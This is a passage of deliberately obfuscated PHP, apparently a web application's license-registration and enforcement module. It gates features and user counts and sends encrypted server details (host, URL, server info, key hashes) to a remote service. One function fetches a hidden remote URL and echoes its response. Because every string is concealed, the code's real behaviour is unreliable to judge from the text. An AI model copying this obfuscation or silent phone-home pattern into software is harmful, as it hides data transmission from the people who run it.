(strlen($œïÇ¬Âï) < $ğ¬’çµÛ[624]) { return; } define($Š­”®Ç¦[21], isset($ÉÖá•àº[1]) && $ÉÖá•àº[0] ? $ÉÖá•àº[1] : $this->defaultController); $µ¾¨ÆßØ = $ğ¬’çµÛ[635]; while ($µ¾¨ÆßØ < $ğ¬’çµÛ[636]) { if ($µ¾¨ÆßØ >= 0) { break; } $µ¾¨ÆßØ++; } define($Š­”®Ç¦[22], isset($ÉÖá•àº[2]) && $ÉÖá•àº[0] ? $ÉÖá•àº[2] : $this->defaultAction); $˜›¾à¼İ = $ğ¬’çµÛ[637]; while ($˜›¾à¼İ < $ğ¬’çµÛ[630]) { if ($˜›¾à¼İ >= 0) { break; } $˜›¾à¼İ++; } define($Š­”®Ç¦[23], MOD . $Š­”®Ç¦[0] . ST . $Š­”®Ç¦[0] . ACT); $ÆË‚¦ = $ğ¬’çµÛ[638]; if (!$ÆË‚¦) { return; } $_SERVER[$Š­”®Ç¦[24]] = strtolower(ACTION); $this->autorun(); $áĞÙÃÂ‚ = $ğ¬’çµÛ[639]; if (count($ÉÖá•àº) >= 3) { $this->appRun($şÆüˆã); } else { $this->appRun(ACTION); } } private $hpbs9e38be83 = array(); private $ndkae0d095ed = ''; public function nskh4f7f17df() { $›£Ú®°¤ =& $_SERVER[Ã¶¡¶„æ]; $«‡Á×ó =& $_SERVER[è¿ÅÂ¤¥]; $this->wnep1f831d72(); $this->omqsc66b4812(); $ÔÌ›ìü® = $›£Ú®°¤[640]; $this->royzbb08121f(); $this->sxnbf984b73a(); $Ô“ƒ±ÖŒ = $›£Ú®°¤[641]; if (strlen($Ô“ƒ±ÖŒ) < $›£Ú®°¤[624]) { die; } $this->nouw24f4a67b(); $ôÈ‰ÅæŒ = $›£Ú®°¤[642]; $this->qpyfe618a02a(); $this->slcmc41dfea9(); $µÎ£›Ø = $›£Ú®°¤[643]; $this->wcaqa624b2a8($«‡Á×ó[25], array($this, $«‡Á×ó[26])); $–ª³É¼Š = $›£Ú®°¤[644]; if (strlen($–ª³É¼Š) < $›£Ú®°¤[624]) { die; } $this->wcaqa624b2a8($«‡Á×ó[27], array($this, $«‡Á×ó[28])); $this->wcaqa624b2a8($«‡Á×ó[29], array($this, $«‡Á×ó[30])); $Âèı÷áÖ = $›£Ú®°¤[645]; while (strlen($Âèı÷áÖ) < $›£Ú®°¤[615]) { if (!$Âèı÷áÖ) { break; } $Âèı÷áÖ++; } $this->wcaqa624b2a8($«‡Á×ó[31], array($this, $«‡Á×ó[32])); } public function qaghb2edc217($ÌÌïÖ•ó) { $†îÌ‹† =& $_SERVER[Ã¶¡¶„æ]; $²¢÷îø =& $_SERVER[è¿ÅÂ¤¥]; $Á´Ø”Àİ = Model($²¢÷îø[33])->get(); $¹ÊïÈÔï = array($²¢÷îø[34], $²¢÷îø[35], $²¢÷îø[36], $²¢÷îø[37], $²¢÷îø[38], $²¢÷îø[39], $²¢÷îø[40], $²¢÷îø[41], $²¢÷îø[42], $²¢÷îø[43], $²¢÷îø[44], $²¢÷îø[45], $²¢÷îø[46], $²¢÷îø[47], $²¢÷îø[48], $²¢÷îø[49], $²¢÷îø[50], $²¢÷îø[51], $²¢÷îø[52], $²¢÷îø[53], $²¢÷îø[54], $²¢÷îø[55], $²¢÷îø[56], $²¢÷îø[57], $²¢÷îø[58], $²¢÷îø[59], $²¢÷îø[60], $²¢÷îø[61], $²¢÷îø[62], $²¢÷îø[63], $²¢÷îø[64], $²¢÷îø[65], $²¢÷îø[66], $²¢÷îø[67], $²¢÷îø[68], $²¢÷îø[69], $²¢÷îø[70], $²¢÷îø[71], $²¢÷îø[72], $²¢÷îø[73], $²¢÷îø[74], $²¢÷îø[75], $²¢÷îø[76], $²¢÷îø[77], $²¢÷îø[78], $²¢÷îø[79], $²¢÷îø[80], $²¢÷îø[81], $²¢÷îø[82], $²¢÷îø[83], $²¢÷îø[84]); foreach ($¹ÊïÈÔï as $ã¢À‚“£) { $Î´Ôîü = $GLOBALS[$²¢÷îø[85]][$²¢÷îø[86]][$ã¢À‚“£]; if (isset($Á´Ø”Àİ[$ã¢À‚“£])) { $Î´Ôîü = $Á´Ø”Àİ[$ã¢À‚“£]; } $ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[88]][$ã¢À‚“£] = $Î´Ôîü; } $”¨í°Û = $ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[88]][$²¢÷îø[46]]; $áØ…ŒÚÛ = $†îÌ‹†[646]; if (strlen($áØ…ŒÚÛ) < $†îÌ‹†[624]) { die; } unset($ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[89]][$²¢÷îø[90]]); $»ÓÛ†“” = $†îÌ‹†[647]; while ($»ÓÛ†“” < $†îÌ‹†[630]) { if ($»ÓÛ†“” >= 0) { break; } $»ÓÛ†“”++; } unset($ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[89]][$²¢÷îø[91]]); unset($ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[88]][$²¢÷îø[46]]); $„¥¿¥È® = $†îÌ‹†[648]; if (strlen($„¥¿¥È®) < $†îÌ‹†[624]) { return; } unset($ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[88]][$²¢÷îø[92]]); $’ƒ²¸® = $†îÌ‹†[649]; while ($’ƒ²¸® < $†îÌ‹†[630]) { if ($’ƒ²¸® >= 0) { break; } $’ƒ²¸®++; } $ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[88]][$²¢÷îø[93]] = array($²¢÷îø[94] => (int) $”¨í°Û[$²¢÷îø[95]], $²¢÷îø[96] => (int) _get($”¨í°Û, $²¢÷îø[97], 0)); $ş·ÒùÀƒ = $†îÌ‹†[650]; if (!$ş·ÒùÀƒ) { return; } $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[99]] = Action($²¢÷îø[100])->accessToken(); $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[101]] = md5($_SERVER[$²¢÷îø[102]] . $Á´Ø”Àİ[$²¢÷îø[103]]); $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[104]] = base64_encode(serverInfo()); $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[105]] = $this->ndkae0d095ed; if ($Á´Ø”Àİ[$²¢÷îø[105]] != $²¢÷îø[106]) { $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[107]] = $Á´Ø”Àİ[$²¢÷îø[107]]; $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[108]] = $Á´Ø”Àİ[$²¢÷îø[108]]; $½à±øĞĞ = rand_string(10) . $this->ndkae0d095ed . rand_string(5); $ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[109]][$²¢÷îø[110]] = $this->mzqlbb1824f8($½à±øĞĞ, $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[101]]); } if ($this->ndkae0d095ed == $²¢÷îø[106]) { $ÌÌïÖ•ó[$²¢÷îø[87]][$²¢÷îø[88]][$²¢÷îø[93]][$²¢÷îø[97]] = 0; } $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[111]] = _get($this->hpbs9e38be83, $²¢÷îø[112], $²¢÷îø[6]); $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[113]] = _get($this->hpbs9e38be83, $²¢÷îø[114], $²¢÷îø[6]); $”ËÁ¾×¶ = $†îÌ‹†[651]; while ($”ËÁ¾×¶ < $†îÌ‹†[615]) { if ($”ËÁ¾×¶ >= 0) { break; } $”ËÁ¾×¶++; } if (_get($GLOBALS, $²¢÷îø[115]) && $this->config[$²¢÷îø[116]]) { $ÌÌïÖ•ó[$²¢÷îø[98]][$²¢÷îø[117]] = WEB_ROOT; } return $ÌÌïÖ•ó; } private function qpyfe618a02a() { $ÇøÕ¨Õ =& $_SERVER[Ã¶¡¶„æ]; $¾¾â†Ç× =& $_SERVER[è¿ÅÂ¤¥]; $²©¸óå‹ = $_SERVER[$¾¾â†Ç×[24]] == $¾¾â†Ç×[118]; if ($_SERVER[$¾¾â†Ç×[24]] == $¾¾â†Ç×[119] && $_GET[$¾¾â†Ç×[120]] == $¾¾â†Ç×[121]) { $²©¸óå‹ = !0; } if ($²©¸óå‹) { $‡Ï¡¥Ôš = array($¾¾â†Ç×[105] => $this->ndkae0d095ed, $¾¾â†Ç×[122] => $this->uclx55b5fdf2(), $¾¾â†Ç×[123] => Model($¾¾â†Ç×[124])->count()); if ($this->ndkae0d095ed != $¾¾â†Ç×[106]) { $ÍÖı§Ê = _get($this->hpbs9e38be83, $¾¾â†Ç×[125]); if ($ÍÖı§Ê) { $‡Ï¡¥Ôš[$¾¾â†Ç×[126]] = $ÍÖı§Ê; $‡Ï¡¥Ôš[$¾¾â†Ç×[127]] = strtotime(_get($this->hpbs9e38be83, $¾¾â†Ç×[128])); $‡Ï¡¥Ôš[$¾¾â†Ç×[129]] = _get($this->hpbs9e38be83, $¾¾â†Ç×[114]); } $Ì•æÁâÎ = Model($¾¾â†Ç×[33])->get($¾¾â†Ç×[130], $¾¾â†Ç×[6], !0); if (is_string($Ì•æÁâÎ) && substr($Ì•æÁâÎ, 0, 1) == $¾¾â†Ç×[131]) { $Ì•æÁâÎ = json_decode_force($Ì•æÁâÎ); } if (is_array($Ì•æÁâÎ) && $Ì•æÁâÎ[$¾¾â†Ç×[132]] && strstr($Ì•æÁâÎ[$¾¾â†Ç×[132]], $¾¾â†Ç×[133])) { $‘¨¸³ä = explode($¾¾â†Ç×[133], $Ì•æÁâÎ[$¾¾â†Ç×[132]]); $‡Ï¡¥Ôš[$¾¾â†Ç×[134]] = $‘¨¸³ä[0]; } } $‡Ï¡¥Ôš = $this->kqgwf557211e(json_encode($‡Ï¡¥Ôš), md5($¾¾â†Ç×[135])); $’’®Ëİ¥ = $ÇøÕ¨Õ[652]; if (strlen($’’®Ëİ¥) < $ÇøÕ¨Õ[615]) { return; } $Ìƒğ°— = array($¾¾â†Ç×[136] => $‡Ï¡¥Ôš); $É£ë£º¹ = $ÇøÕ¨Õ[653]; if (!$É£ë£º¹) { die; } call_user_func(array($¾¾â†Ç×[137], $¾¾â†Ç×[138]), $Ìƒğ°—); } if ($this->ndkae0d095ed == $¾¾â†Ç×[106]) { return; } $Ë¹²˜û¶ = array($¾¾â†Ç×[139], $¾¾â†Ç×[140], $¾¾â†Ç×[141], $¾¾â†Ç×[142], $¾¾â†Ç×[143], $¾¾â†Ç×[144]); $õ¼ß”Ìï = Model($¾¾â†Ç×[33])->get(); $Ìƒğ°— = array($¾¾â†Ç×[145] => $õ¼ß”Ìï[$¾¾â†Ç×[34]], $¾¾â†Ç×[146] => $õ¼ß”Ìï[$¾¾â†Ç×[35]], $¾¾â†Ç×[147] => $¾¾â†Ç×[6]); foreach ($Ë¹²˜û¶ as $ş”Åà) { if (!isset($õ¼ß”Ìï[$ş”Åà]) || !$õ¼ß”Ìï[$ş”Åà]) { continue; } $Ìƒğ°—[$ş”Åà] = $õ¼ß”Ìï[$ş”Åà]; } call_user_func(array($¾¾â†Ç×[137], $¾¾â†Ç×[138]), $Ìƒğ°—); $†Ó”Üß´ = $ÇøÕ¨Õ[654]; } private function sxnbf984b73a() { $äÕÜÍå =& $_SERVER[Ã¶¡¶„æ]; $å‚ùøŸ =& $_SERVER[è¿ÅÂ¤¥]; if ($_SERVER[$å‚ùøŸ[24]] != $å‚ùøŸ[148]) { return; } if (!_get($GLOBALS, $å‚ùøŸ[115])) { die; } $¡ØÃš• = $GLOBALS[$å‚ùøŸ[13]]; if (isset($¡ØÃš•[$å‚ùøŸ[149]])) { $this->oqyle78ade0a(); die; } if (!isset($¡ØÃš•[$å‚ùøŸ[150]]) || strlen($¡ØÃš•[$å‚ùøŸ[150]]) != 16) { show_json($å‚ùøŸ[151] . $¡ØÃš•[$å‚ùøŸ[150]], !1); } $ÎÙ¤ÁíÖ = Model($å‚ùøŸ[33])->get($å‚ùøŸ[103]); $ƒ”íæÌˆ = md5($_SERVER[$å‚ùøŸ[102]] . $ÎÙ¤ÁíÖ); $ò»â¾ÔÉ = array($å‚ùøŸ[150] => $¡ØÃš•[$å‚ùøŸ[150]], $å‚ùøŸ[152] => rand_string(16), $å‚ùøŸ[153] => $å‚ùøŸ[135], $å‚ùøŸ[154] => $å‚ùøŸ[155], $å‚ùøŸ[156] => $_SERVER[$å‚ùøŸ[157]], $å‚ùøŸ[158] => $_SERVER[$å‚ùøŸ[159]], $å‚ùøŸ[160] => $_SERVER[$å‚ùøŸ[161]], $å‚ùøŸ[101] => $ƒ”íæÌˆ, $å‚ùøŸ[162] => Model($å‚ùøŸ[33])->get($å‚ùøŸ[130])); if ($¡ØÃš•[$å‚ùøŸ[163]] == $å‚ùøŸ[164]) { $éö¼âÚ = $this->kqgwf557211e($ƒ”íæÌˆ, $å‚ùøŸ[165]); $ƒ“ü = $this->mzqlbb1824f8(json_encode($ò»â¾ÔÉ), $ƒ”íæÌˆ . $å‚ùøŸ[166], 3); $ƒ“ü = $ƒ“ü . $å‚ùøŸ[167] . $_SERVER[$å‚ùøŸ[157]]; $è…Éï¨º = $this->lerd2bcbae59($å‚ùøŸ[168] . $éö¼âÚ . $å‚ùøŸ[169] . $ƒ“ü, -1); show_json($è…Éï¨º, !0); } else { if ($¡ØÃš•[$å‚ùøŸ[163]] == $å‚ùøŸ[170]) { $¯ğéàşŞ = substr(md5($å‚ùøŸ[171] . $ƒ”íæÌˆ), 12, 15) . $å‚ùøŸ[172]; $ƒ“ü = $this->lkwfa356961a(trim($¡ØÃš•[$å‚ùøŸ[173]]), $¯ğéàşŞ, 2); $Â™Ê”œ = json_decode($ƒ“ü, !0); if (!is_array($Â™Ê”œ) || !is_array($Â™Ê”œ[$å‚ùøŸ[174]]) || $Â™Ê”œ[$å‚ùøŸ[150]] != !0) { $ª´Æ…ä = $å‚ùøŸ[175]; $ôå…èÚŠ = $Â™Ê”œ[$å‚ùøŸ[174]] ? $å‚ùøŸ[176] . $Â™Ê”œ[$å‚ùøŸ[174]] : $ª´Æ…ä; show_json($ôå…èÚŠ, !1); } else { $ò»â¾ÔÉ[$å‚ùøŸ[152]] = $Â™Ê”œ[$å‚ùøŸ[174]][$å‚ùøŸ[177]]; } } else { $Â™Ê”œ = $this->lerd2bcbae59($å‚ùøŸ[178], $ò»â¾ÔÉ, 10); $Øê¯±Ç˜ = $äÕÜÍå[655]; } } if (!is_array($Â™Ê”œ) || !is_array($Â™Ê”œ[$å‚ùøŸ[174]]) || $Â™Ê”œ[$å‚ùøŸ[150]] != !0) { $ª´Æ…ä = LNG($å‚ùøŸ[179]); $ôå…èÚŠ = $Â™Ê”œ[$å‚ùøŸ[174]] ? $å‚ùøŸ[176] . $Â™Ê”œ[$å‚ùøŸ[174]] : $ª´Æ…ä; show_json($ôå…èÚŠ, !1); } $ÇÅÌ­û° = $Â™Ê”œ[$å‚ùøŸ[174]]; $Íæ¼´Àæ = $this->exbp9a4001da($ÇÅÌ­û°[$å‚ùøŸ[180]]); $ÇÆ„¹ï‚ = $äÕÜÍå[656]; if (strlen($ÇÆ„¹ï‚) < $äÕÜÍå[630]) { die; } if (!$Íæ¼´Àæ || $Íæ¼´Àæ != $ÇÅÌ­û°[$å‚ùøŸ[128]]) { $ ÊÉŞ = array($å‚ùøŸ[181] => Model($å‚ùøŸ[33])->get($å‚ùøŸ[103]), $å‚ùøŸ[182] => $_SERVER[$å‚ùøŸ[102]], $å‚ùøŸ[183] => this_url(), $å‚ùøŸ[158] => $_SERVER[$å‚ùøŸ[159]]); $ƒ“ü = $this->kvon292c5ba3(json_encode($ ÊÉŞ)); $this->lerd2bcbae59($å‚ùøŸ[184] . $ƒ“ü); show_json(LNG($å‚ùøŸ[185]), !0); } $Å›‡Áñ = array($å‚ùøŸ[186] => $ÇÅÌ­û°[$å‚ùøŸ[187]], $å‚ùøŸ[188] => $ÇÅÌ­û°[$å‚ùøŸ[189]], $å‚ùøŸ[190] => rand_string(16), $å‚ùøŸ[105] => $ÇÅÌ­û°[$å‚ùøŸ[191]]); if ($ò»â¾ÔÉ[$å‚ùøŸ[152]]) { $Å›‡Áñ[$å‚ùøŸ[190]] = $ò»â¾ÔÉ[$å‚ùøŸ[152]]; } $éÅ—íà¦ = substr(md5($Å›‡Áñ[$å‚ùøŸ[188]]), 10, 10); $»­áËæÆ = $éÅ—íà¦ . $Å›‡Áñ[$å‚ùøŸ[105]] . $Å›‡Áñ[$å‚ùøŸ[190]]; $×ÇÛÑ«‰ = $äÕÜÍå[657]; while (strlen($×ÇÛÑ«‰) < $äÕÜÍå[619]) { if (!$×ÇÛÑ«‰) { break; } $×ÇÛÑ«‰++; } $Å›‡Áñ[$å‚ùøŸ[107]] = strrev(base64_encode($this->kqgwf557211e($»­áËæÆ, $å‚ùøŸ[192]))); $˜¤Â§é = $äÕÜÍå[658]; $ÀäƒŞ­ = rand_string(16); $ãİ¯Ö’ó = $ÀäƒŞ­ . $Å›‡Áñ[$å‚ùøŸ[105]] . $this->kqgwf557211e(md5($Å›‡Áñ[$å‚ùøŸ[186]]), $ÀäƒŞ­); $³Ü˜ü¯É = $äÕÜÍå[659]; while (strlen($³Ü˜ü¯É) < $äÕÜÍå[630]) { if (!$³Ü˜ü¯É) { break; } $³Ü˜ü¯É++; } $Å›‡Áñ[$å‚ùøŸ[108]] = base64_encode(strrev($this->kqgwf557211e($ãİ¯Ö’ó, $å‚ùøŸ[193]))); if ($ÇÅÌ­û°[$å‚ùøŸ[194]] && $ÇÅÌ­û°[$å‚ùøŸ[194]] >= 1) { Model($å‚ùøŸ[33])->setDeep($å‚ùøŸ[195], $å‚ùøŸ[121]); } Model($å‚ùøŸ[33])->set($Å›‡Áñ); $¿îßØƒ = md5($_SERVER[$å‚ùøŸ[102]] . strrev($ÎÙ¤ÁíÖ) . $Å›‡Áñ[$å‚ùøŸ[188]]); $¾¼äüòã = $äÕÜÍå[660]; $ë–ğÅ«ƒ = strrev(substr($¿îßØƒ, 10, 16)); $±Ïå›¥ø = $äÕÜÍå[661]; if (!$±Ïå›¥ø) { return; } $ØïÏ•Äş = $this->mzqlbb1824f8(json_encode($ÇÅÌ­û°), $¿îßØƒ); $•Ñ¬ïü„ = array_to_keyvalue(Model($å‚ùøŸ[7])->listData(), $å‚ùøŸ[196]); $ó¦İû¤ = $äÕÜÍå[662]; if (!$ó¦İû¤) { return; } $ÍïÙŒÔÂ = $•Ñ¬ïü„[$å‚ùøŸ[197]]; $éêØ™® = $äÕÜÍå[663]; $”Üìå²‘ = array(); $”Üìå²‘[$ë–ğÅ«ƒ] = $ØïÏ•Äş; $¼À“Šô„ = $äÕÜÍå[664]; if (strlen($¼À“Šô„) < $äÕÜÍå[630]) { return; } Model($å‚ùøŸ[7])->update($ÍïÙŒÔÂ[$å‚ùøŸ[198]], array($å‚ùøŸ[199] => $”Üìå²‘)); $êß¬ñ° = $äÕÜÍå[665]; if (strlen($êß¬ñ°) < $äÕÜÍå[615]) { return; } $this->hpbs9e38be83 = $ÇÅÌ­û°; $ÖÍçæÍ­ = $äÕÜÍå[666]; while ($ÖÍçæÍ­ < $äÕÜÍå[624]) { if ($ÖÍçæÍ­ >= 0) { break; } $ÖÍçæÍ­++; } $this->ndkae0d095ed = $Å›‡Áñ[$å‚ùøŸ[105]]; $this->licenseRegistSuccess(); $»‹ú†ıì = $äÕÜÍå[667]; while (strlen($»‹ú†ıì) < $äÕÜÍå[630]) { if (!$»‹ú†ıì) { break; } $»‹ú†ıì++; } Cache::set($å‚ùøŸ[200] . md5($ÎÙ¤ÁíÖ . $å‚ùøŸ[201]), $å‚ùøŸ[6]); show_json(LNG($å‚ùøŸ[185]), !0); $ø¾ÊÍ¥÷ = $äÕÜÍå[668]; while ($ø¾ÊÍ¥÷ < $äÕÜÍå[630]) { if ($ø¾ÊÍ¥÷ >= 0) { break; } $ø¾ÊÍ¥÷++; } } private function licenseRegistSuccess() { $ŠŞÅË«Ş =& $_SERVER[è¿ÅÂ¤¥]; $ê­¶â½ñ = Model($ŠŞÅË«Ş[33])->get(); if ($ê­¶â½ñ[$ŠŞÅË«Ş[63]] != $ŠŞÅË«Ş[121]) { Model($ŠŞÅË«Ş[33])->set($ŠŞÅË«Ş[63], $ŠŞÅË«Ş[121]); } Action($ŠŞÅË«Ş[202])->initStart(!0); } private function oqyle78ade0a() { $·ìí²‘ß =& $_SERVER[Ã¶¡¶„æ]; $ºïˆÈã =& $_SERVER[è¿ÅÂ¤¥]; Model($ºïˆÈã[33])->set(array($ºïˆÈã[186] => $ºïˆÈã[6], $ºïˆÈã[188] => $ºïˆÈã[6], $ºïˆÈã[105] => $ºïˆÈã[106], $ºïˆÈã[107] => $ºïˆÈã[6], $ºïˆÈã[108] => $ºïˆÈã[6])); Model($ºïˆÈã[33])->setDeep($ºïˆÈã[195], $ºïˆÈã[203]); $this->hpbs9e38be83 = array(); $åâƒ™æè = $·ìí²‘ß[669]; while (strlen($åâƒ™æè) < $·ìí²‘ß[624]) { if (!$åâƒ™æè) { break; } $åâƒ™æè++; } $this->ndkae0d095ed = $ºïˆÈã[106]; } private function wnep1f831d72() { $èË¼®šÇ =& $_SERVER[Ã¶¡¶„æ]; $“„ß‘ÏĞ =& $_SERVER[è¿ÅÂ¤¥]; $_SERVER[$“„ß‘ÏĞ[159]] = _get($_SERVER, $“„ß‘ÏĞ[159], APP_HOST); $this->ndkae0d095ed = $“„ß‘ÏĞ[106]; $çŠ¬ãã­ = Model($“„ß‘ÏĞ[33])->get(); $ãÛÈí× = $èË¼®šÇ[670]; if (strlen($ãÛÈí×) < $èË¼®šÇ[615]) { return; } if ($çŠ¬ãã­[$“„ß‘ÏĞ[105]] == $“„ß‘ÏĞ[106]) { return; } $³‚¿°ê = Model($“„ß‘ÏĞ[33])->get($“„ß‘ÏĞ[103]); $ş¿èÜ¢’ = $èË¼®šÇ[671]; if (strlen($ş¿èÜ¢’) < $èË¼®šÇ[619]) { die; } $ºÑÙ¯Êì = $“„ß‘ÏĞ[200] . md5($³‚¿°ê . $“„ß‘ÏĞ[201]); $‡Ô¥ˆ¿ = $èË¼®šÇ[672]; $Ñ•±Ù±½ = Cache::get($ºÑÙ¯Êì); if (!is_array($Ñ•±Ù±½) || !isset($Ñ•±Ù±½[$“„ß‘ÏĞ[204]]) || time() - $Ñ•±Ù±½[$“„ß‘ÏĞ[204]] >= 60) { $à·³œÔè = Model($“„ß‘ÏĞ[7])->loadList(); $ùŒ¶ˆ¬Â = $à·³œÔè[$“„ß‘ÏĞ[197]]; $‘¥¤íÇ² = md5($_SERVER[$“„ß‘ÏĞ[102]] . strrev($³‚¿°ê) . $çŠ¬ãã­[$“„ß‘ÏĞ[188]]); $„³£šÂ = strrev(substr($‘¥¤íÇ², 10, 16)); $Ñ•±Ù±½ = $this->lkwfa356961a($ùŒ¶ˆ¬Â[$“„ß‘ÏĞ[85]][$„³£šÂ], $‘¥¤íÇ²); $Ñ•±Ù±½ = json_decode($Ñ•±Ù±½, !0); } if (!is_array($Ñ•±Ù±½)) { return $this->oqyle78ade0a(); } $¢£Ú’ö„ = strtotime($Ñ•±Ù±½[$“„ß‘ÏĞ[128]]); if (time() >= $¢£Ú’ö„) { return $this->oqyle78ade0a(); } if (time() - $Ñ•±Ù±½[$“„ß‘ÏĞ[204]] > 20) { $Ñ•±Ù±½[$“„ß‘ÏĞ[204]] = time(); Cache::set($ºÑÙ¯Êì, $Ñ•±Ù±½); } $this->hpbs9e38be83 = $Ñ•±Ù±½; $this->ndkae0d095ed = $çŠ¬ãã­[$“„ß‘ÏĞ[105]]; $¢À¡•Ã² = $èË¼®šÇ[673]; } private function omqsc66b4812() { $–øàµ×¶ =& $_SERVER[è¿ÅÂ¤¥]; $±ªŞõ²¯ = $GLOBALS[$–øàµ×¶[13]]; $ªÅ»š¢ú = $_SERVER[$–øàµ×¶[24]]; if ($ªÅ»š¢ú == $–øàµ×¶[205] && $this->ndkae0d095ed == $–øàµ×¶[106]) { show_json(LNG($–øàµ×¶[206]), !1, $–øàµ×¶[207]); } $ò•¤ğªÒ = array($–øàµ×¶[208], $–øàµ×¶[209]); if (in_array($ªÅ»š¢ú, $ò•¤ğªÒ)) { if ($this->ndkae0d095ed == $–øàµ×¶[106] && isset($±ªŞõ²¯[$–øàµ×¶[210]])) { show_json(LNG($–øàµ×¶[206]), !1, $–øàµ×¶[207]); die; } $Àö‹õ¦‰ = $this->uclx55b5fdf2(); if ($Àö‹õ¦‰ != intval($–øàµ×¶[211])) { if ($Àö‹õ¦‰ <= Model($–øàµ×¶[124])->count()) { show_json(LNG($–øàµ×¶[212]), !1, $–øàµ×¶[207]); die; } } } } private function royzbb08121f() { $£Ü•¼’œ =& $_SERVER[Ã¶¡¶„æ]; $Ï—ÀúÖå =& $_SERVER[è¿ÅÂ¤¥]; $êçÛ²«¸ = array($Ï—ÀúÖå[118], $Ï—ÀúÖå[119]); if (!_get($GLOBALS, $Ï—ÀúÖå[115]) || !isset($_GET[$Ï—ÀúÖå[213]])) { return; } if (!in_array($_SERVER[$Ï—ÀúÖå[24]], $êçÛ²«¸)) { return; } $Ï¿¨ìÌê = $Ï—ÀúÖå[214]; $¡ÔŒÕ¿• = $£Ü•¼’œ[674]; while ($¡ÔŒÕ¿• < $£Ü•¼’œ[619]) { if ($¡ÔŒÕ¿• >= 0) { break; } $¡ÔŒÕ¿•++; } $Ï¿¨ìÌê = $this->cunp63e49e87($Ï¿¨ìÌê, $Ï—ÀúÖå[215]); $İå¯Ğ— = stream_context_create(array($Ï—ÀúÖå[216] => array($Ï—ÀúÖå[217] => $Ï—ÀúÖå[218], $Ï—ÀúÖå[219] => 3))); $¢èßØ¨ï = $£Ü•¼’œ[675]; while (strlen($¢èßØ¨ï) < $£Ü•¼’œ[619]) { if (!$¢èßØ¨ï) { break; } $¢èßØ¨ï++; } $¾¸ş¤Ùê = @file_get_contents($Ï¿¨ìÌê, !1, $İå¯Ğ—); $óÉ«  = $£Ü•¼’œ[676]; if (!$óÉ« ) { return; } header($Ï—ÀúÖå[220]); $”Œêâ¦› = $£Ü•¼’œ[677]; if (strlen($”Œêâ¦›) < $£Ü•¼’œ[615]) { return; } if ($¾¸ş¤Ùê && strstr($¾¸ş¤Ùê, $Ï—ÀúÖå[221])) { echo $¾¸ş¤Ùê; } die; } public function fyqgd0db5f5f($¯‡À·¹) { $éà«½Ë· =& $_SERVER[è¿ÅÂ¤¥]; if ($this->ndkae0d095ed == $éà«½Ë·[222]) { return $¯‡À·¹; } $œÉª¦’ò = array($éà«½Ë·[223] => $éà«½Ë·[224], $éà«½Ë·[225] => $éà«½Ë·[224], $éà«½Ë·[226] => $éà«½Ë·[224], $éà«½Ë·[227] => $éà«½Ë·[224], $éà«½Ë·[228] => $éà«½Ë·[229], $éà«½Ë·[230] => $éà«½Ë·[229], $éà«½Ë·[231] => $éà«½Ë·[229], $éà«½Ë·[232] => $éà«½Ë·[229], $éà«½Ë·[233] => $éà«½Ë·[229], $éà«½Ë·[234] => $éà«½Ë·[229], $éà«½Ë·[235] => $éà«½Ë·[229], $éà«½Ë·[236] => $éà«½Ë·[229], $éà«½Ë·[237] => $éà«½Ë·[229], $éà«½Ë·[238] => $éà«½Ë·[229], $éà«½Ë·[239] => $éà«½Ë·[229], $éà«½Ë·[240] => $éà«½Ë·[229]); $ì•¸Á¦Ó = explode($éà«½Ë·[241], _get($this->hpbs9e38be83, $éà«½Ë·[112], $éà«½Ë·[6])); $Êş£§®¨ = array(); foreach ($œÉª¦’ò as $à¬üøíÎ => $¤ôµ£Ö„) { if ($¤ôµ£Ö„ == $éà«½Ë·[224] && substr($this->ndkae0d095ed, 0, 1) == $éà«½Ë·[224]) { continue; } if (!in_array($à¬üøíÎ, $ì•¸Á¦Ó)) { $Êş£§®¨[] = $à¬üøíÎ; } } foreach ($Êş£§®¨ as $à¬üøíÎ) { unset($¯‡À·¹[$à¬üøíÎ]); } return $¯‡À·¹; $òÛÓè©¤ = $_SERVER[Ã¶¡¶„æ][678]; if (!$òÛÓè©¤) { die; } } private function slcmc41dfea9() { $ôÇ¾Éó =& $_SERVER[è¿ÅÂ¤¥]; if ($this->ndkae0d095ed != $ôÇ¾Éó[106]) { $GLOBALS[$ôÇ¾Éó[85]][$ôÇ¾Éó[89]][$ôÇ¾Éó[242]] = $ôÇ¾Éó[203]; return; } $GLOBALS[$ôÇ¾Éó[85]][$ôÇ¾Éó[243]] = $ôÇ¾Éó[121]; if (Model($ôÇ¾Éó[244])->get($ôÇ¾Éó[63]) != $ôÇ¾Éó[203]) { Model($ôÇ¾Éó[244])->set($ôÇ¾Éó[63], $ôÇ¾Éó[203]); } } public function rheq1f42ac26() { return $_SERVER[è¿ÅÂ¤¥][245]; } private function nouw24f4a67b() { $¼á×™†Â =& $_SERVER[Ã¶¡¶„æ]; $éæ±®ÌØ =& $_SERVER[è¿ÅÂ¤¥]; $‘’ˆï¦ê = array($éæ±®ÌØ[246], $éæ±®ÌØ[247], $éæ±®ÌØ[248]); $™ÓÜğ²€ = $éæ±®ÌØ[249] . md5($éæ±®ÌØ[250]); if ($this->ndkae0d095ed == $éæ±®ÌØ[106] || !_get($GLOBALS, $éæ±®ÌØ[115])) { return; } if (!in_array($_SERVER[$éæ±®ÌØ[24]], $‘’ˆï¦ê)) { return; } if (time() % 4 != 0) { return; } $Ï¿‰Ş˜è = call_user_func(array($éæ±®ÌØ[251], $éæ±®ÌØ[252]), $™ÓÜğ²€); if ($Ï¿‰Ş˜è && time() - $Ï¿‰Ş˜è < intval($éæ±®ÌØ[253])) { return; } call_user_func(array($éæ±®ÌØ[251], $éæ±®ÌØ[138]), 